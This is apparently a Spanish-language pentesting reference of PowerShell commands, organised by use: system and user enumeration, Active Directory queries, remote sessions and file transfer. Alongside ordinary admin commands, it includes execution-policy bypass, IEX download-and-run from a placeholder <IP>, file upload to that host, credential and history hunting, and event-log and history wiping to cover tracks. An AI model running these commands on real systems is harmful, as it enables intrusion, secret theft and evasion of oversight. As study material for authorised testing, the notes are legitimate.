# PowerShell — Referencia de Comandos

Tags: #Windows #PowerShell #Comandos #Referencia #Enumeracion #AD

## OBJETIVO

Referencia rápida de comandos PowerShell organizados por contexto de uso. Complementa la nota de Windows_Comandos.md con comandos específicos de PowerShell.

## TIPS

1. **Get-Help "comando" -Examples → ver ejemplos de cualquier cmdlet**
2. **Los comandos de CMD también funcionan en PowerShell → dir, type, ipconfig, etc.**
3. **| Select-Object → filtrar solo las propiedades que necesitas → output más limpio**
4. **-ErrorAction SilentlyContinue → silenciar errores en búsquedas recursivas**
5. **IEX → ejecutar strings como comandos → cargar scripts en memoria sin tocar disco**

---

## 1. INFORMACIÓN DEL SISTEMA Y VERSIÓN

```powershell
❯ Get-Host
# Ver versión de PowerShell

❯ $PSVersionTable
# Información detallada de la versión de PowerShell

❯ Get-ComputerInfo
# Información completa del sistema → OS, hardware, dominio

❯ Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsHardwareAbstractionLayer

❯ systeminfo
# También funciona en PowerShell → parches, arquitectura, dominio

❯ Get-HotFix
# Parches instalados → identificar parches que faltan → PrivEsc

❯ Get-HotFix | Sort-Object InstalledOn -Descending
# Ordenar por fecha → ver los más recientes
```

---

## 2. USUARIO Y PRIVILEGIOS

```powershell
❯ whoami
❯ whoami /priv
❯ whoami /all
# También funcionan en PowerShell
# SeImpersonatePrivilege → Potato attacks → SYSTEM directo

❯ Get-LocalUser
# Usuarios locales del sistema

❯ Get-LocalUser | Select Name,Enabled,LastLogon,PasswordLastSet

❯ Get-LocalGroup
# Grupos locales

❯ Get-LocalGroupMember Administrators
# Miembros del grupo Administrators

❯ Get-LocalGroupMember "Remote Desktop Users"
```

---

## 3. RED Y CONECTIVIDAD

```powershell
❯ Test-Connection "192.168.0.1"
# Ping → equivalente a ping en CMD

❯ Test-Connection "192.168.0.1" -Count 1 -Quiet
# -Quiet → devuelve True/False → útil en scripts

❯ Get-NetIPAddress
# Interfaces e IPs del sistema

❯ Get-NetIPAddress | Select InterfaceAlias,IPAddress,AddressFamily
# Solo info relevante → buscar múltiples interfaces para pivoting

❯ Get-NetRoute
# Tabla de ruteo

❯ Get-NetTCPConnection
# Conexiones TCP activas → equivalente a netstat -ano

❯ Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
# Solo puertos en escucha → servicios internos

❯ Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 3306}
# Buscar servicio específico por puerto

❯ Get-DnsClientServerAddress
# Servidores DNS → en AD identificar DCs

❯ Resolve-DnsName <dominio>
# Resolver nombre DNS → identificar IPs de servicios
```

---

## 4. PROCESOS Y SERVICIOS

```powershell
❯ Get-Process
# Procesos en ejecución

❯ Get-Process | Where-Object {$_.Name -like "*sql*"}
# Buscar proceso específico

❯ Stop-Process -Id <PID> -Force
❯ Stop-Process -Name <proceso> -Force

❯ Get-Service
# Todos los servicios

❯ Get-Service | Where-Object {$_.Status -eq "Running"}
# Solo servicios activos

❯ Start-Service <servicio>
❯ Stop-Service <servicio>
❯ Restart-Service <servicio>

❯ Get-WmiObject -Class win32_service | Select Name,State,PathName,StartMode
# Servicios con ruta del ejecutable → buscar rutas escribibles o sin comillas
# PathName con espacios y sin comillas → Unquoted Service Path → PrivEsc
```

---

## 5. SISTEMA DE ARCHIVOS Y BÚSQUEDA

```powershell
❯ Get-ChildItem
# Equivalente a dir/ls

❯ Get-ChildItem -Force
# Incluir archivos y directorios ocultos

❯ dir -Force
# Atajo → mismo resultado

❯ Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue
# Buscar recursivamente ignorando errores de permisos

❯ Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini -ErrorAction SilentlyContinue
# Buscar archivos por extensión recursivamente

❯ Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*pass*"}
# Buscar archivos con "pass" en el nombre

❯ Get-Content <archivo>
# Leer contenido de archivo → equivalente a type/cat

❯ Get-Content archivo.txt | Select-String "password"
# Buscar patrón dentro de un archivo

❯ cmd /c dir /r /s file.txt
# Buscar archivo recursivamente desde CMD dentro de PowerShell
```

### Password Hunting en archivos

```powershell
# Buscar credenciales en directorio de instalaciones
$Files = Get-ChildItem 'C:\Program Files\*' -Recurse -ErrorAction SilentlyContinue
Get-ChildItem $Files -Include *.json,*.txt,*.config,*.inc,*.prop,*.xml,*.sql -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","pwd","user","usr","API","API_KEY","KEY","secret","token"

# Búsqueda más amplia en todo el sistema
Get-ChildItem -Recurse -Include *.txt,*.xml,*.config,*.ini,*.json,*.sql -ErrorAction SilentlyContinue | Select-String -Pattern "password","pwd","secret","key","token","api"

# En carpetas de usuarios
Get-ChildItem 'C:\Users\*' -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.config | Select-String -Pattern "password","pass","secret"
```

---

## 6. HISTORIAL Y CREDENCIALES

```powershell
# Historial de PowerShell → muy valioso → puede contener credenciales
❯ Get-Content (Get-PSReadLineOption).HistorySavePath
# Forma más fiable → obtiene la ruta automáticamente

❯ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Ruta directa

# Credenciales guardadas
❯ cmdkey /list
# Ver credenciales almacenadas en el Credential Manager

# Variables de entorno → pueden contener credenciales
❯ Get-ChildItem Env:
# Ver todas las variables de entorno

❯ $env:USERNAME
❯ $env:COMPUTERNAME
❯ $env:USERPROFILE
❯ $env:LOGONSERVER
# DC que autenticó al usuario → útil en AD
```

---

## 7. TAREAS PROGRAMADAS Y ARRANQUE

```powershell
❯ Get-ScheduledTask
# Ver todas las tareas programadas

❯ Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
# Solo tareas activas

❯ Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select TaskName,TaskPath,State
# Solo campos relevantes

# Arranque automático → posible PrivEsc o persistencia
❯ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
❯ Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

---

## 8. POLÍTICA DE EJECUCIÓN Y BYPASS

```powershell
❯ Get-ExecutionPolicy
# Ver política actual → Restricted, RemoteSigned, Unrestricted, Bypass

❯ Get-ExecutionPolicy -List
# Ver política por scope

❯ Set-ExecutionPolicy Bypass -Scope Process -Force
# Bypass solo para el proceso actual → no cambia la política global

❯ powershell -ExecutionPolicy Bypass -File script.ps1
# Ejecutar script ignorando la política

❯ powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -c "comando"
# Sin perfil y no interactivo → más sigiloso

# Cargar script en memoria sin guardar en disco
❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
❯ Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
```

---

## 9. EJECUCIÓN REMOTA (WINRM / PSSESSION)

```powershell
# Crear sesión remota
❯ $session = New-PSSession -ComputerName 'server_name' -Verbose
❯ $session
# Ver ID, Name, ComputerName de la sesión

# Ejecutar comandos en la sesión remota
❯ Invoke-Command -Session $session -ScriptBlock {whoami; ipconfig} -Verbose

# Entrar a la sesión interactivamente
❯ Enter-PSSession -Session $session -Verbose

# Dentro de la sesión remota
❯ klist
# Ver tickets Kerberos activos

# Con credenciales explícitas
❯ $cred = Get-Credential
❯ $session = New-PSSession -ComputerName 'server_name' -Credential $cred
❯ Enter-PSSession -Session $session

# Ejecutar sin sesión persistente
❯ Invoke-Command -ComputerName <hostname> -ScriptBlock {whoami} -Credential <usuario>

# Cerrar sesión
❯ Exit-PSSession
❯ Remove-PSSession $session
```

---

## 10. ACTIVE DIRECTORY — ENUMERACIÓN

```powershell
# Con módulo ActiveDirectory (si está disponible)
❯ Import-Module ActiveDirectory

❯ Get-ADUser -Filter * | Select Name,SamAccountName,Enabled
# Todos los usuarios del dominio

❯ Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description | Where-Object {$_.Description -ne $null}
# Usuarios con descripción → buscar contraseñas en la descripción

❯ Get-ADGroup -Filter * | Select Name
# Grupos del dominio

❯ Get-ADGroupMember "Domain Admins" | Select Name,SamAccountName
# Miembros de Domain Admins

❯ Get-ADComputer -Filter * | Select Name,DNSHostName,OperatingSystem
# Equipos del dominio

❯ Get-ADDomain
# Información del dominio

# Sin módulo AD → con ADSI directamente
❯ ([adsisearcher]"(objectClass=user)").FindAll()
# Usuarios via ADSI → no requiere módulo AD

❯ ([adsisearcher]"(objectClass=computer)").FindAll()
# Equipos via ADSI

# Enumeración de acceso admin en otras máquinas
❯ Find-WMILocalAdminAccess.ps1 -Verbose
# Requiere PowerView → enumerar máquinas donde tienes acceso admin local
```

---

## 11. TRANSFERENCIA DE ARCHIVOS

```powershell
# Descargar
❯ Invoke-WebRequest -Uri http://<IP>/archivo -OutFile C:\Temp\archivo
❯ IWR -Uri http://<IP>/archivo -OutFile C:\Temp\archivo

❯ (New-Object Net.WebClient).DownloadFile('http://<IP>/archivo','C:\Temp\archivo')
# Más compatible con versiones antiguas de PS

# Ejecutar en memoria → no toca el disco → más sigiloso
❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

# Subir archivo
❯ Invoke-WebRequest -Uri http://<IP>/upload -Method POST -InFile C:\archivo.txt

# Base64 para transferir sin red
❯ [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\archivo.exe'))
# Encodear → copiar output → en Kali: echo <string> | base64 -d > archivo.exe

❯ $b64 = "<base64_string>"
❯ [IO.File]::WriteAllBytes('C:\Temp\archivo.exe', [Convert]::FromBase64String($b64))
# Decodear base64 y guardar como binario
```

---

## 12. LIMPIEZA DE EVIDENCIA

```powershell
❯ Clear-EventLog -LogName Security,System,Application
# Limpiar logs de eventos → requiere admin

❯ Remove-Item (Get-PSReadLineOption).HistorySavePath
# Borrar historial de PowerShell

❯ Set-PSReadLineOption -HistorySaveStyle SaveNothing
# Deshabilitar guardado del historial para la sesión actual

❯ [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
# Limpiar historial en memoria
```